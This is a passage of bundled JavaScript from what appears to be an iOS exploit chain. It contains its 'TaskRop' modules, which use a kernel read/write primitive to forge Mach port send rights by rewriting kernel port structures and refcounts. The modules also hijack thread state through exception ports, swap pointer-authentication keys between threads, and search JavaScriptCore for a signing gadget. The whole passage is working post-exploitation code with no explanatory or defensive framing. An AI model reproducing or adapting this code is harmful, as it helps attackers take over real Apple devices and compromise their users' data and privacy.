			console.log(TAG,`Waiting exception...`);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			excBuffer,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, this.ExceptionMessageSize,
			exceptionPort,
			timeout,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			//console.log(TAG,`Error receiving exception message:${errString}`);
			return false;
		}
		if (debug)
		{
			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(excBuffer,Number(this.ExceptionMessageSize));
			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__["default"](excRes);
			let elapsed = new Date().getTime() - t1;
			//console.log(TAG,`Got exception succesfully after ${elapsed} ms with [id:${exc.Head.msgh_id}, exc=${exc.exception}, code=${Utils.hex(exc.codeFirst)}]`);
			//console.log(TAG,`PC:${Utils.hex(exc.threadState.opaque_pc)}`);
			//console.log(TAG,`LR:${Utils.hex(exc.threadState.opaque_lr)}`);
			//console.log(TAG,`SP:${Utils.hex(exc.threadState.opaque_sp)}`);
			//console.log(TAG,`FP:${Utils.hex(exc.threadState.opaque_fp)}`);
			//for(let i = 0; i < 29; i++)
			//	console.log(TAG,`x[${i}]:${Utils.hex(exc.threadState.registers.get(i))}`);
		}
		return true;
	}

	static replyWithState(exc,state,debug)
	{
		let replyBuf = new ArrayBuffer(Number(this.ExceptionReplySize));
		let reply = new _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__["default"](replyBuf);
		let sendSize = Number(this.ExceptionReplySize);
		let recvSize = 0n;
		if(debug)
		{
			console.log(TAG,`Reply with state:`);
			console.log(TAG,`PC:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_pc)}`);
			console.log(TAG,`LR:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_lr)}`);
			console.log(TAG,`SP:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_sp)}`);
			console.log(TAG,`FP:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_fp)}`);
		}
		
		reply.Head.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
		reply.Head.msgh_size = sendSize;
		reply.Head.msgh_remote_port = exc.Head.msgh_remote_port;
		reply.Head.msgh_local_port = 0;
		reply.Head.msgh_id = exc.Head.msgh_id + 100;
		reply.NDR = exc.NDR;
		reply.RetCode = 0;
		reply.flavor = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64;
		reply.new_stateCnt = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT;
		//TODO make it inside ThreadState to copy thread state to another variable
		for(let i = 0; i < 29; i++)
		{
			reply.threadState.registers.set(i,state.registers.get(i));
		}
		reply.threadState.opaque_fp = state.opaque_fp;
		reply.threadState.opaque_lr = state.opaque_lr;
		reply.threadState.opaque_sp = state.opaque_sp;
		reply.threadState.opaque_pc = state.opaque_pc;
		reply.threadState.cspr = state.cspr;
		reply.threadState.opaque_flags = state.opaque_flags;
		let replyMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(replyMem,replyBuf);
		if(debug)
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].printArrayBufferInChunks(replyBuf);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
				replyMem,
				MACH_SEND_MSG,
				sendSize, recvSize,
				0n,
				0n,
				0n);

		if (ret != 0)
			console.log(TAG,`Error replying exception:${libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret)}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/ExceptionMessageStruct.js":
/*!****************************************************!*\
  !*** ./src/libs/TaskRop/ExceptionMessageStruct.js ***!
  \****************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ExceptionMessageStruct)
/* harmony export */ });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");


class ExceptionMessageStruct 
{
	#buffer;
	#dataView;

	constructor(buffer) {
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
		this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](this.#buffer);
		this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](this.#buffer,64);
	}

	get NDR() { return this.#dataView.getBigUint64(24,true); }
	set NDR(value) { this.#dataView.setBigUint64(24,value,true); }

	get exception() { return this.#dataView.getUint32(32,true); }
	set exception(value) { this.#dataView.setUint32(32,value,true); }

	get codeCnt() { return this.#dataView.getUint32(36,true); }
	set codeCnt(value) { this.#dataView.setUint32(36,value,true); }

	get codeFirst() { return this.#dataView.getBigUint64(40,true); }
	set codeFirst(value) { this.#dataView.setBigUint64(40,value,true); }

	get codeSecond() { return this.#dataView.getBigUint64(48,true); }
	set codeSecond(value) { this.#dataView.setBigUint64(48,value,true); }

	get flavor() { return this.#dataView.getUint32(56,true); }
	set flavor(value) { this.#dataView.setUint32(56,value,true); }

	get old_stateCnt() { return this.#dataView.getUint32(60,true); }
	set old_stateCnt(value) { this.#dataView.setUint32(60,value,true); }

	get paddingFirst() { return this.#dataView.getBigUint64(336,true); }
	set paddingFirst(value) { this.#dataView.setBigUint64(336,value,true); }
	
	get paddingSecond() { return this.#dataView.getBigUint64(344,true); }
	set paddingSecond(value) { this.#dataView.setBigUint64(344,value,true); }
}

/***/ }),

/***/ "./src/libs/TaskRop/ExceptionReplyStruct.js":
/*!**************************************************!*\
  !*** ./src/libs/TaskRop/ExceptionReplyStruct.js ***!
  \**************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ExceptionReplyStruct)
/* harmony export */ });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");


class ExceptionReplyStruct 
{
	#buffer;
	#dataView;

	constructor(buffer) {
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
		this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](this.#buffer);
		this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](this.#buffer,44);
	}

	get NDR() { return this.#dataView.getBigUint64(24,true); }
	set NDR(value) { this.#dataView.setBigUint64(24,value,true); }

	get RetCode() { return this.#dataView.getUint32(32,true); }
	set RetCode(value) { this.#dataView.setUint32(32,value,true); }

	get flavor() { return this.#dataView.getUint32(36,true); }
	set flavor(value) { this.#dataView.setUint32(36,value,true); }
	
	get new_stateCnt() { return this.#dataView.getUint32(40,true); }
	set new_stateCnt(value) { this.#dataView.setUint32(40,value,true); }
}

/***/ }),

/***/ "./src/libs/TaskRop/MachMsgHeaderStruct.js":
/*!*************************************************!*\
  !*** ./src/libs/TaskRop/MachMsgHeaderStruct.js ***!
  \*************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ MachMsgHeaderStruct)
/* harmony export */ });
class MachMsgHeaderStruct
{
	#dataView;

	constructor(buffer, offset = 0) {
		this.#dataView = new DataView(buffer,offset);
	}

	get msgh_bits() { return this.#dataView.getUint32(0,true); }
	set msgh_bits(value) { this.#dataView.setUint32(0,value,true); }

	get msgh_size() { return this.#dataView.getUint32(4,true); }
	set msgh_size(value) { this.#dataView.setUint32(4,value,true); }

	get msgh_remote_port() { return this.#dataView.getUint32(8,true); }
	set msgh_remote_port(value) { this.#dataView.setUint32(8,value,true); }

	get msgh_local_port() { return this.#dataView.getUint32(12,true); }
	set msgh_local_port(value) { this.#dataView.setUint32(12,value,true); }

	get msgh_voucher_port() { return this.#dataView.getUint32(16,true); }
	set msgh_voucher_port(value) { this.#dataView.setUint32(16,value,true); }
	
	get msgh_id() { return this.#dataView.getUint32(20,true); }
	set msgh_id(value) { this.#dataView.setUint32(20,value,true); }

	static MACH_MSGH_BITS(remote, local)
	{
		return ((remote) | ((local) << 8));
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/PAC.js":
/*!*********************************!*\
  !*** ./src/libs/TaskRop/PAC.js ***!
  \*********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PAC)
/* harmony export */ });
//import Chain from "libs/Chain/Chain";
//import Native from "libs/JSUtils/Native";
//import Utils from "libs/JSUtils/Utils";
//import Exception from "./Exception";
//import Task from "./Task";
//import Thread from "./Thread";
//import ThreadState from "./ThreadState";
//import ExceptionMessageStruct from "./ExceptionMessageStruct";
//import Offsets from "Driver/Offsets";

const TAG = "PAC";

class PAC
{
	static gadget_pacia;

	static {
		//this.#findGadgets();
	}
	static remotePACLocal(address, modifier)
	{
		address = address & 0x7fffffffffn;
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}
	static remotePAC(threadAddr, address, modifier)
	{
		return Native.pacia(address, modifier);
		
		//return this.remotePACLocal(address, modifier);
		/*
		if (!this.gadget_pacia)
		{
			console.log(TAG,`Doesn't have gadget_pacia, aborting`);
			return 0;
		}
		address = address & 0x7fffffffffn;

		let signedAddress = 0n;

		// Get PAC keys of remote thread
		let keyA = Thread.getRopPid(threadAddr);
		let keyB = Thread.getJopPid(threadAddr);

		//console.log(TAG,`Key A:${Utils.hex(keyA)}`);
		//console.log(TAG,`Key B:${Utils.hex(keyB)}`);

		let kr = 0;
		let pacThread = Native.mem;
		Native.callSymbol("thread_create", 0x203, pacThread);
		let buffRes = Native.read(pacThread, Utils.UINT32_SIZE);
		let viewRes = new DataView(buffRes);
		pacThread = viewRes.getUint32(0,true);
		//console.log(TAG,`pacThread:${Utils.hex(pacThread)}`);
		let stack = Native.callSymbol("malloc",0x4000n);
		let sp = stack + 0x2000n;
		let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		let state = new ThreadState(stateBuff);
		state.opaque_sp = sp;
		//arm_thread_state64_set_pc_fptr(state, (void*)gadget_pacia);
		let outputBuffer = Native.mem;
		//console.log(TAG,`Before pacia`);
		if(pacia)
			state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
		else
			state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			//console.log(TAG, "Applying 18 fix");
			//state.opaque_lr = 0x401n;
			state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
		}
		//console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
		//state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
		state.registers.set(0,outputBuffer);
		state.registers.set(1,BigInt(address));
		state.registers.set(2,BigInt(modifier));
		state.registers.set(3,BigInt(pacThread));
		state.registers.set(16,BigInt(address));
		state.registers.set(17,BigInt(modifier));

		let exceptionPort = Exception.createPort();
		if (!exceptionPort)
		{
			console.log(TAG,`Cannot create exception port`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}

		//console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);

		kr = Native.callSymbol("thread_set_exception_ports",
			pacThread,
			Utils.EXC_MASK_BAD_ACCESS,
			exceptionPort,
			Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
			BigInt(Utils.ARM_THREAD_STATE64));
		
		if (kr != 0)
		{
			console.log(`thread_set_exception_ports failed:${kr}`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
		//console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
		if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
		{
			console.log(TAG,`Failed to set thread state`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		// Change pacThread PAC keys with those of remote thread
		Thread.setPACKeys(pacThreadAddr, keyA, keyB);
		//console.log(TAG,`Starting PAC thread...`);
		Native.callSymbol("thread_resume",pacThread);
		let excBuffer = Native.mem;
		if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
		{
			console.log(TAG,`Failed to receive exception from PAC thread`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		signedAddress = exc.threadState.registers.get(16);
		//console.log(TAG,`Signed address: ${Utils.hex(address)} -> signedAddress:${Utils.hex(signedAddress)}`);
		this.#cleanup(pacThread, exceptionPort, stack);
		return signedAddress;
		*/
	}

	/*
	static #findGadgets()
	{
		let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
		if (!sym)
		{
			console.log(TAG,`Symbol not found`);
			return false;
		}

		let symStripped = sym & ~0xffffff8000000000n;
		let gadgetOpcodesBuff = new ArrayBuffer(20);
		let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
		gadgetOpcodesView.setUint32(0,0xDAC10230,true);
		gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
		gadgetOpcodesView.setUint32(8,0xF100011F,true);
		gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
		gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
		let data = Native.read(symStripped,0x1000);
		let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
		if (!gadgetOffset)
		{
			console.log(TAG,`pacia_gadget offset not found`);
			return false;
		}
		this.gadget_pacia = symStripped + BigInt(gadgetOffset);

		console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);

		return true;
	}

	static #setThreadState(thread,threadAddr,stateBuff)
	{
		let options = Thread.getOptions(threadAddr);
		options |= 0x8000;	
		Thread.setOptions(threadAddr, options);
		let stateMem = Native.mem;
		Native.write(stateMem,stateBuff);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = Native.callSymbol("thread_set_state",
			thread,
			BigInt(Utils.ARM_THREAD_STATE64),
			stateMem,
			BigInt(Utils.ARM_THREAD_STATE64_COUNT));
		if (kr != 0)
		{
			console.log(TAG,`Failed thread_set_state with error:${kr}`);
			return false;
		}

		options &= ~0x8000;
		Thread.setOptions(threadAddr, options);
		return true;
	}

	static #cleanup(pacThread,exceptionPort,stack)
	{
		Native.callSymbol("thread_terminate",pacThread);
		Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
		Native.callSymbol("free",stack);
	}
	*/
}

/***/ }),

/***/ "./src/libs/TaskRop/PortRightInserter.js":
/*!***********************************************!*\
  !*** ./src/libs/TaskRop/PortRightInserter.js ***!
  \***********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PortRightInserter)
/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");


const TAG = "PORTRIGHTINSERTER";

const TASK_SELF = 0x203;
const MACH_PORT_NULL = 0;
const MACH_PORT_TYPE_SEND = 0x10000;
const MACH_PORT_TYPE_DEAD_NAME = 0x100000;

const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;

const MACH_MSG_TYPE_COPY_SEND = 19; 
const MACH_MSG_TYPE_MAKE_SEND = 20;
const MACH_MSG_TYPE_MAKE_SEND_ONCE = 21;

const MACH_MSGH_BITS_COMPLEX = 0x80000000;
const MACH_MSG_PORT_DESCRIPTOR = 0;

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;

const IO_BITS_KOLABEL = 0x00000400;
const IE_BITS_TYPE_MASK = 0x001f0000;

class PortRightInserter {
	
	static insert(portKaddr) {
		const p = this.#newPort();
		//console.log(TAG, "New port: " + Utils.hex(p));
		const pAddr = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortAddr(BigInt(p));
		//console.log(TAG, "New port addr: " + Utils.hex(pAddr));
		if (!pAddr)
			return 0;

		//this.#dumpPort(portKaddr);
		//this.#dumpPort(pAddr);

		const backupBits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(portKaddr);
		//console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
		const needsFixBits = (backupBits & IO_BITS_KOLABEL);

		if (needsFixBits) {
			const newBits = backupBits & ~IO_BITS_KOLABEL;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(portKaddr, newBits);
		}

		this.#fixRefCounts(portKaddr, 1);

		//console.log(TAG, "Fix Ok");
		//this.#dumpPort(portKaddr);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipNsRequest, portKaddr);
		//this.#dumpPort(pAddr);

		let previous = this.#notifyNoSenders(p, MACH_PORT_NULL);
		//console.log(TAG, "Previous right: " + Utils.hex(previous));

		// Change the port rights from send once to send.
		this.#switchToSendRight(previous);

		//this.#fixRefCounts(portKaddr, -1, false);

		// We have a send right to the port, but it's not in our space's hash.
    	// We send the port, then kill the entry. We'll properly receive it afterwards.
		let msgBuff = new ArrayBuffer(40);
		let msgHeader = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"](msgBuff);
		msgHeader.msgh_id = 0x4141;
		msgHeader.msgh_remote_port = p;
		msgHeader.msgh_local_port = p;
		msgHeader.msgh_size = msgBuff.byteLength;
		msgHeader.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	// we send a port descriptor

		let msgBody = new DataView(msgBuff, 24);
		msgBody.setInt32(0, 1, true); 					// msgh_descriptor_count
		msgBody.setUint32(4, previous, true);			// name
		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	// disposition
		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	// type

		//let wMsg64 = new BigUint64Array(msgBuff);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);

		let msgMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(msgMem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_SEND_MSG,
			msgBuff.byteLength, 0,
			p,
			0,
			0);
		//console.log(TAG, "mach_msg: " + ret);
		//Native.callSymbol("sleep", 1);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error sending message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg send: " + ret);

		this.#killRight(previous);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].memSize,
			p,
			1000,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error receiving message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg recv: " + ret);
		//Native.callSymbol("sleep", 1);

		let rMsg = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(msgMem, 40);

		//let rMsg64 = new BigUint64Array(rMsg);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);

		msgBody = new DataView(rMsg, 24);
		previous = msgBody.getUint32(4, true);
		//console.log(TAG, "previous: " + Utils.hex(previous));

		this.#fixRefCounts(portKaddr, -1);

		//this.#dumpPort(portKaddr);

		return previous;
	}

	static #newPort() {
		const options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		const newPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct", TASK_SELF, options, 0n, newPortPtr);
		if (kr != 0) {
			console.log(TAG, `Error creating port: ${kr}`);
			return MACH_PORT_NULL;
		}
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(newPortPtr);
	}

	static #switchToSendRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_SEND;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #killRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_DEAD_NAME;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(entry, 0n);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #fixRefCounts(portAddr, diff, updateRefs=true, updateSonce=true) {
		// Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
		// since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
		// So we read all the 144 bytes struct, changes values and then write it again as a whole.

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPort = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPortView = new DataView(ipcPort);

		let refs = ipcPortView.getUint32(0x4, true);
		let sonce = ipcPortView.getUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), true);

		//console.log(TAG, "refs: " + refs);
		//console.log(TAG, "sonce: " + sonce);

		refs += diff;
		sonce += diff;

		if (updateRefs) {
			//console.log(TAG, "new refs: " + refs);
			ipcPortView.setUint32(0x4, refs, true);
		}
		if (updateSonce) {
			//console.log(TAG, "new sonce: " + sonce);
			ipcPortView.setUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), sonce, true);
		}

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, ipcPort);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].writeZoneElement(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
	}

	static #notifyNoSenders(port, notifyPort) {
		const MACH_NOTIFY_NO_SENDERS = 0o106;
		
		const previousPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_request_notification",
			TASK_SELF,
			port,
			MACH_NOTIFY_NO_SENDERS,
			0,
			notifyPort,
			MACH_MSG_TYPE_MAKE_SEND_ONCE,
			previousPtr);
		//console.log(TAG, "mach_port_request_notification: " + kr);
		if (kr != 0)
			return MACH_PORT_NULL;
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(previousPtr);
	}

	static #dumpPort(pAddr) {
		console.log(TAG, "dump port: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(pAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(pAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<0x12; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}

	static #dumpEntry(entryAddr) {
		console.log(TAG, "dump entry: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(entryAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(entryAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<3; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/RegistersStruct.js":
/*!*********************************************!*\
  !*** ./src/libs/TaskRop/RegistersStruct.js ***!
  \*********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ RegistersStruct)
/* harmony export */ });
const TAG = "REGISTERSSTRUCT"

class RegistersStruct
{
	#dataView;

	constructor(buffer, offset = 0, length = 29) {
		this.#dataView = new DataView(buffer,offset, length * 8);
		this.length = length;
	}
    
	get(index) {
